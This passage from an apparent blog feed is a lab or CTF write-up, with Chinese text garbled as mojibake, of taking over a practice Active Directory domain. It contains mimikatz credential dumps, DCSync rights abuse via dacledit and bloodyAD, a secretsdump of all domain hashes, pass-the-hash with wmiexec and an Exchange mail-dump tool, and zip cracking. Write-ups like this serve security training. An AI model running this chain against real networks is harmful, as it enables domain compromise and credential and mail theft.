a4 1f 09 8d 12 b2 83 69 83 e1 e9 32 56 ee 43 47 19 35 66 f5 e9 44 ee 5d 90 e1 60 01 bd 46 12 e7 54 1c 84 14 58 4a a4 00 18 ce 93 6d 9c b5 0a 3d 6d d9 db 02 86 44 1e 1b fc 62 73 b0 51 8a 09 44 50 dc 14 b1 38 d2 1d cd 71 d3 ed e5 c6 a2 1d 07 17 bd 2f 9b 58 79 91 d6 ed 73 76 a9 a8 47 fe 28 eb 99 f0 c0 52 72 8b 29 3d ea e1 41 79 e7 59 39 22 b0 0b 66 f9 ea c1 70 02 59 9e df a2 1d b8 96 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 1954603 (00000000:001dd32b)</span><br><span class="line">Session           : RemoteInteractive from 2</span><br><span class="line">User Name         : Zhangtong</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : XIAORANG-WIN16</span><br><span class="line">Logon Time        : 2025/3/11 14:49:11</span><br><span class="line">SID               : S-1-5-21-533686307-2117412543-4200729784-1147</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : Zhangtong</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 22c7f81993e96ac83ac2f3f1903de8b4</span><br><span class="line"> * SHA1     : 4d205f752e28b0a13e7a2da2a956d46cb9d9e01e</span><br><span class="line"> * DPAPI    : ed14c3c4ef895b1d11b04fb4e56bb83b</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : Zhangtong</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : Zhangtong</span><br><span class="line"> * Domain   : XIAORANG.LAB</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 1880438 (00000000:001cb176)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : DWM-2</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/11 14:49:10</span><br><span class="line">SID               : S-1-5-90-0-2</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 55c05b3a95ba11efa84aa33e20861e6f</span><br><span class="line"> * SHA1     : a551d481dcc12fcc09b5f27660b7b78d12b0523a</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : xiaorang.lab</span><br><span class="line"> * Password : 0f 3a 16 8a 52 bd 7d cc fe 2b 9c 57 8b f5 c7 7a c5 f0 a9 68 27 59 d1 8e a2 f1 ce af 48 b1 05 f2 1a 8d 9d 0c 85 7c 85 80 7e e3 0e 68 4c cc 8a f4 0e 93 af 23 26 4a 26 03 b3 2c 88 18 98 da db 21 93 40 d8 78 05 ec 4d 4e 2d d4 55 fe c6 2b 31 d6 11 fe dc 51 5c 00 c1 eb 67 a1 15 d0 56 c7 31 dd da dd f8 42 19 e0 9a 6f 89 76 bf 17 de be 6e cf a4 1f 09 8d 12 b2 83 69 83 e1 e9 32 56 ee 43 47 19 35 66 f5 e9 44 ee 5d 90 e1 60 01 bd 46 12 e7 54 1c 84 14 58 4a a4 00 18 ce 93 6d 9c b5 0a 3d 6d d9 db 02 86 44 1e 1b fc 62 73 b0 51 8a 09 44 50 dc 14 b1 38 d2 1d cd 71 d3 ed e5 c6 a2 1d 07 17 bd 2f 9b 58 79 91 d6 ed 73 76 a9 a8 47 fe 28 eb 99 f0 c0 52 72 8b 29 3d ea e1 41 79 e7 59 39 22 b0 0b 66 f9 ea c1 70 02 59 9e df a2 1d b8 96 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : XIAORANG-EXC01$</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/11 14:47:42</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 55c05b3a95ba11efa84aa33e20861e6f</span><br><span class="line"> * SHA1     : a551d481dcc12fcc09b5f27660b7b78d12b0523a</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : xiaorang-exc01$</span><br><span class="line"> * Domain   : XIAORANG.LAB</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 23747 (00000000:00005cc3)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/11 14:47:27</span><br><span class="line">SID               : </span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 55c05b3a95ba11efa84aa33e20861e6f</span><br><span class="line"> * SHA1     : a551d481dcc12fcc09b5f27660b7b78d12b0523a</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line">kerberos :</span><br><span class="line">ssp :</span><br><span class="line"> [00000000]</span><br><span class="line"> * Username : HealthMailbox0d5918ea7298475bbbb7e3602e1e289d@xiaorang.lab</span><br><span class="line"> * Domain   : (null)</span><br><span class="line"> * Password : Mh*vj]Z]Q02hqT+VLOB:_Se]zl@VS+v&gt;4Z^P+c=u;VQf+MiJD(?^=w#RmpxDeEI29QR&amp;e%^9nn3s*35h74jW5JeWV8^8fa#f9SIAv5)Dl5#hqaUZO2)m-)VT=huQe)[c</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 2399786 (00000000:00249e2a)</span><br><span class="line">Session           : NetworkCleartext from 0</span><br><span class="line">User Name         : HealthMailbox0d5918e</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : XIAORANG-WIN16</span><br><span class="line">Logon Time        : 2025/3/11 14:49:39</span><br><span class="line">SID               : S-1-5-21-533686307-2117412543-4200729784-1136</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : HealthMailbox0d5918e</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 2dd2fea458c9690609313e7d7c1d1094</span><br><span class="line"> * SHA1     : 710b23fb4ffb87bf98b5821e0e7a9b622e0a3283</span><br><span class="line"> * DPAPI    : 4bb9f57b64b8fb82bcaabba12708f6bb</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : HealthMailbox0d5918e</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : HealthMailbox0d5918e</span><br><span class="line"> * Domain   : XIAORANG.LAB</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 1880415 (00000000:001cb15f)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : DWM-2</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/11 14:49:10</span><br><span class="line">SID               : S-1-5-90-0-2</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 55c05b3a95ba11efa84aa33e20861e6f</span><br><span class="line"> * SHA1     : a551d481dcc12fcc09b5f27660b7b78d12b0523a</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : XIAORANG-EXC01$</span><br><span class="line"> * Domain   : xiaorang.lab</span><br><span class="line"> * Password : 0f 3a 16 8a 52 bd 7d cc fe 2b 9c 57 8b f5 c7 7a c5 f0 a9 68 27 59 d1 8e a2 f1 ce af 48 b1 05 f2 1a 8d 9d 0c 85 7c 85 80 7e e3 0e 68 4c cc 8a f4 0e 93 af 23 26 4a 26 03 b3 2c 88 18 98 da db 21 93 40 d8 78 05 ec 4d 4e 2d d4 55 fe c6 2b 31 d6 11 fe dc 51 5c 00 c1 eb 67 a1 15 d0 56 c7 31 dd da dd f8 42 19 e0 9a 6f 89 76 bf 17 de be 6e cf a4 1f 09 8d 12 b2 83 69 83 e1 e9 32 56 ee 43 47 19 35 66 f5 e9 44 ee 5d 90 e1 60 01 bd 46 12 e7 54 1c 84 14 58 4a a4 00 18 ce 93 6d 9c b5 0a 3d 6d d9 db 02 86 44 1e 1b fc 62 73 b0 51 8a 09 44 50 dc 14 b1 38 d2 1d cd 71 d3 ed e5 c6 a2 1d 07 17 bd 2f 9b 58 79 91 d6 ed 73 76 a9 a8 47 fe 28 eb 99 f0 c0 52 72 8b 29 3d ea e1 41 79 e7 59 39 22 b0 0b 66 f9 ea c1 70 02 59 9e df a2 1d b8 96 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 105109 (00000000:00019a95)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : Zhangtong</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : XIAORANG-WIN16</span><br><span class="line">Logon Time        : 2025/3/11 14:47:44</span><br><span class="line">SID               : S-1-5-21-533686307-2117412543-4200729784-1147</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : Zhangtong</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 22c7f81993e96ac83ac2f3f1903de8b4</span><br><span class="line"> * SHA1     : 4d205f752e28b0a13e7a2da2a956d46cb9d9e01e</span><br><span class="line"> * DPAPI    : ed14c3c4ef895b1d11b04fb4e56bb83b</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : Zhangtong</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : Zhangtong</span><br><span class="line"> * Domain   : XIAORANG.LAB</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/11 14:47:43</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">msv :</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : (null)</span><br><span class="line"> * Domain   : (null)</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : (null)</span><br><span class="line"> * Domain   : (null)</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # exit</span><br><span class="line">Bye!</span><br></pre></td></tr></table></figure><p>è¿™ä¸¤ä¸ªæ¯”è¾ƒæœ‰ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Zhangtong</span><br><span class="line">22c7f81993e96ac83ac2f3f1903de8b4</span><br><span class="line"> </span><br><span class="line">XIAORANG-EXC01$</span><br><span class="line">55c05b3a95ba11efa84aa33e20861e6f</span><br></pre></td></tr></table></figure><p>ä¼ ä¸ªAdinfoæ”¶é›†ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Adinfo_win.exe -d xiaorang.lab --dc 172.22.3.2 -u XIAORANG-EXC01$ -H 55c05b3a95ba11efa84aa33e20861e6f</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">           _____  _        __</span><br><span class="line">     /\   |  __ \(_)      / _|</span><br><span class="line">    /  \  | |  | |_ _ __ | |_ ___</span><br><span class="line">   / /\ \ | |  | | | &#x27;_ \|  _/ _ \     Tools that collect information from domain</span><br><span class="line">  / ____ \| |__| | | | | | || (_) |</span><br><span class="line"> /_/    \_\_____/|_|_| |_|_| \___/     v1.5 by lzz</span><br><span class="line"></span><br><span class="line">[i] Try to connect &#x27;172.22.3.2&#x27;</span><br><span class="line">[c] Auth Domain: xiaorang.lab</span><br><span class="line">[c] Auth user: XIAORANG-EXC01$</span><br><span class="line">[c] Auth hash: 55c05b3a95ba11efa84aa33e20861e6f</span><br><span class="line">[c] connected successfully,try to dump domain info</span><br><span class="line">[i] DomainVersion found!</span><br><span class="line">                    [+] Windows 2016 Server operating system</span><br><span class="line">[i] Domain SID:</span><br><span class="line">                    [+] S-1-5-21-533686307-2117412543-4200729784</span><br><span class="line">[i] Domain MAQ found</span><br><span class="line">                    [+] 10</span><br><span class="line">[i] Domain Account Policy found</span><br><span class="line">                    [+] pwdHistory: 24</span><br><span class="line">                    [+] minPwdLength: 7</span><br><span class="line">                    [+] minPwdAge: 1(day)</span><br><span class="line">                    [+] maxPwdAge: 10675199(day)</span><br><span class="line">                    [+] lockoutThreshold: 0</span><br><span class="line">                    [+] lockoutDuration: 30(min)</span><br><span class="line">[i] Domain Controllers: 1 found</span><br><span class="line">                    [+] XIAORANG-WIN16$  ==&gt;&gt;&gt;   Windows Server 2016 Datacenter  [10.0 (14393)]  ==&gt;&gt;&gt;  172.22.3.2</span><br><span class="line">[i] ADCS has not found!</span><br><span class="line">[i] Domain Exchange Server: 1 found</span><br><span class="line">                    [+] XIAORANG-EXC01$  ==&gt;&gt;&gt;  Exchange Server 2016  ==&gt;&gt;&gt;  172.22.3.9</span><br><span class="line">[i] Domain All DNS:</span><br><span class="line">                    [+] Domain Dns 3 found,Saved in All_DNS.csv</span><br><span class="line">[i] Domain Trusts: 0 found</span><br><span class="line">[i] SPN: 59 found</span><br><span class="line">[i] Domain GPOs: 2 found</span><br><span class="line">[i] Domain Admins: 1 users found</span><br><span class="line">                    [+]Administrator</span><br><span class="line">[i] Enterprise Admins: 1 users found</span><br><span class="line">                    [+]Administrator</span><br><span class="line">[i] administrators: 1 users found</span><br><span class="line">                    [+]Administrator</span><br><span class="line">[i] Backup Operators: 0 users found</span><br><span class="line">[i] Users: 27 found</span><br><span class="line">[i] User with Mail: 23 found</span><br><span class="line">[i] Only_name_and_Useful_Users: 14 found</span><br><span class="line">[i] Only_admincount=1_andUseful_Users: 1 found</span><br><span class="line">[i] Locked Users: 0 found</span><br><span class="line">[i] Disabled Users: 13 found</span><br><span class="line">[i] Users with passwords not set to expire: 13 found</span><br><span class="line">[i] Domain Computers: 3 found</span><br><span class="line">[i] Only_name_and_Useful_computers: 3 found</span><br><span class="line">[i] Groups: 69 found</span><br><span class="line">[i] Domain OUs: 2 found</span><br><span class="line">[i] LAPS Not found</span><br><span class="line">[i] LAPS passwords: 0 found</span><br><span class="line">[i] SensitiveDelegate Users: 0 found</span><br><span class="line">[i] AsReproast Users: 0 found</span><br><span class="line">[i] Kerberoast Users: 1 found</span><br><span class="line">                    [+] CN=krbtgt,CN=Users,DC=xiaorang,DC=lab  ==&gt;&gt;&gt;  kadmin/changepw</span><br><span class="line">[i] SIDHistory Users: 0 found</span><br><span class="line">[i] CreatorSID Users: 0 found</span><br><span class="line">[i] RBCD Users: 0 found</span><br><span class="line">[i] Unconstrained Deligation Users: 0 found</span><br><span class="line">[i] Constrained Deligation Users: 0 found</span><br><span class="line">[i] Krbtgt password last set time: 2022-10-23 14:40:45 +0800 CST</span><br><span class="line">[i] CSVs written to &#x27;csv&#x27; directory in C:\Users\calm\Desktop</span><br><span class="line">[i] Execution took 2.1943333s</span><br></pre></td></tr></table></figure><h2 id="WriteDACL"><a href="#WriteDACL" class="headerlink" title="WriteDACL"></a>WriteDACL</h2><p>Exchangeæœºå™¨è´¦æˆ·é»˜è®¤å¯¹åŸŸå†…æˆå‘˜å…·æœ‰ WriteDACL æƒé™, å› æ­¤å¯ä»¥å†™ DCSync<br>exchangeæœºå™¨è´¦æˆ·éš¶å±äºExchange Windows Permissionsè¿™ä¸ªç»„ä¸­ï¼Œè€Œè¿™ä¸ªç»„å…·æœ‰write åŸŸå†…aclæƒé™ï¼Œæ‰€ä»¥å¯ä»¥è®¾ç½®åˆšåˆšé€šè¿‡mimikatzæ‹¿åˆ°çš„åŸŸå†…ç”¨æˆ·Zhangtongçš„dcsyncå±æ€§ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 dacledit.py xiaorang.lab/XIAORANG-EXC01\$ -hashes :55c05b3a95ba11efa84aa33e20861e6f -action write -rights DCSync -principal Zhangtong -target-dn &quot;DC=xiaorang,DC=lab&quot; -dc-ip 172.22.3.2</span><br></pre></td></tr></table></figure><p>è¿™è¾¹æŠ¥é”™æ¢ä¸ªå·¥å…·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 bloodyAD.py -d xiaorang.lab -u &#x27;XIAORANG-EXC01$&#x27; -p :55c05b3a95ba11efa84aa33e20861e6f --host 172.22.3.2 add dcsync Zhangtong</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741679539260-24fedf10-9edb-40f8-8b21-c0b8fd251240.png"></p><p>æ‰“DSCyncè·å–åŸŸæ§hashå†æ‰“pth</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-secretsdump xiaorang.lab/XIAORANG-EXC01\$@172.22.3.2 -hashes :22c7f81993e96ac83ac2f3f1903de8b4 -just-dc</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">xiaorang.lab\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7acbc09a6c0efd81bfa7d5a1d4238beb:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b8fa79a52e918cb0cbcd1c0ede492647:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\$431000-7AGO1IPPEUGJ:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_46bc0bcd781047eba:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_2554056e362e45ba9:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_ae8e35b0ca3e41718:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_341e33a8ba4d46c19:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_3d52038e2394452f8:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_2ddd7a0d26c84e7cb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_015b052ab8324b3fa:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_9bd6f16aa25343e68:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_68af2c4169b54d459:1133:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\HealthMailbox8446c5b:1135:aad3b435b51404eeaad3b435b51404ee:6a049c17ae6f214d0ce0bb958be94c7a:::</span><br><span class="line">xiaorang.lab\HealthMailbox0d5918e:1136:aad3b435b51404eeaad3b435b51404ee:33cd42e4c654333ef6118bea55f376ba:::</span><br><span class="line">xiaorang.lab\HealthMailboxeda7a84:1137:aad3b435b51404eeaad3b435b51404ee:1e89e23e265bb7b54dc87938b1b1a131:::</span><br><span class="line">xiaorang.lab\HealthMailbox33b01cf:1138:aad3b435b51404eeaad3b435b51404ee:0eff3de35019c2ee10b68f48941ac50d:::</span><br><span class="line">xiaorang.lab\HealthMailbox9570292:1139:aad3b435b51404eeaad3b435b51404ee:e434c7db0f0a09de83f3d7df25ec2d2f:::</span><br><span class="line">xiaorang.lab\HealthMailbox3479a75:1140:aad3b435b51404eeaad3b435b51404ee:c43965ecaa92be22c918e2604e7fbea0:::</span><br><span class="line">xiaorang.lab\HealthMailbox2d45c5b:1141:aad3b435b51404eeaad3b435b51404ee:4822b67394d6d93980f8e681c452be21:::</span><br><span class="line">xiaorang.lab\HealthMailboxec2d542:1142:aad3b435b51404eeaad3b435b51404ee:147734fa059848c67553dc663782e899:::</span><br><span class="line">xiaorang.lab\HealthMailboxf5f7dbd:1143:aad3b435b51404eeaad3b435b51404ee:e7e4f69b43b92fb37d8e9b20848e6b66:::</span><br><span class="line">xiaorang.lab\HealthMailbox67dc103:1144:aad3b435b51404eeaad3b435b51404ee:4fe68d094e3e797cfc4097e5cca772eb:::</span><br><span class="line">xiaorang.lab\HealthMailbox320fc73:1145:aad3b435b51404eeaad3b435b51404ee:0c3d5e9fa0b8e7a830fcf5acaebe2102:::</span><br><span class="line">xiaorang.lab\Lumia:1146:aad3b435b51404eeaad3b435b51404ee:862976f8b23c13529c2fb1428e710296:::</span><br><span class="line">Zhangtong:1147:aad3b435b51404eeaad3b435b51404ee:22c7f81993e96ac83ac2f3f1903de8b4:::</span><br><span class="line">XIAORANG-WIN16$:1000:aad3b435b51404eeaad3b435b51404ee:b9df9852037915b5f26114769ace114a:::</span><br><span class="line">XIAORANG-EXC01$:1103:aad3b435b51404eeaad3b435b51404ee:b0d89dce8c89f4a43758961e8f782174:::</span><br><span class="line">XIAORANG-PC$:1104:aad3b435b51404eeaad3b435b51404ee:74d63202f94c220e09056568feafa894:::</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure><p>æ‰“pth</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 wmiexec.py xiaorang.lab/Administrator@172.22.3.2 -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb -dc-ip 172.22.3.2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\Administrator\flag\flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741680084218-92447ba8-9bea-4f89-b3aa-a64b3b6d093e.png"></p><p>æ¥ç€æ‰“pthå¦ä¸€å°æœºå™¨ç»“æœæ²¡æœ‰flagï¼Œsmbè¿è¿‡å»Lumiaæ¡Œé¢å‘ç°æœ‰å‹ç¼©åŒ…ï¼ˆçˆ†ç ´ä¸äº†ï¼‰ï¼Œæœ€åå‘ç°æ˜¯dumpé‚®ä»¶<a href="https://github.com/Jumbo-WJB/PTH_Exchange">https://github.com/Jumbo-WJB/PTH_Exchange</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 pthexchange.py --target https://172.22.3.9/ --username Lumia --password &#x27;00000000000000000000000000000000:862976f8b23c13529c2fb1428e710296&#x27; --action Download</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741680501359-e00f52ee-b331-469b-8c40-3f4827f8bc42.png"></p><p>å¾—åˆ°æ‰‹æœºå·å’Œç”¨æˆ·åï¼Œçˆ†ç ´ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip2john secret.zip &gt;zip.txt</span><br><span class="line">john --wordlist=1.txt zip.txt</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741680801506-a8481aab-f692-4523-a7f8-4bb10c733bce.png"></p><p>18763918468</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741680788965-984babdd-f9b5-49c4-82ac-dabe6da3a546.png"></p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ”»é˜² </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŸŸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ˜¥ç§‹äº‘å¢ƒ-Certify</title>
      <link href="/2025/03/09/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/"/>
      <url>/2025/03/09/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/</url>
      
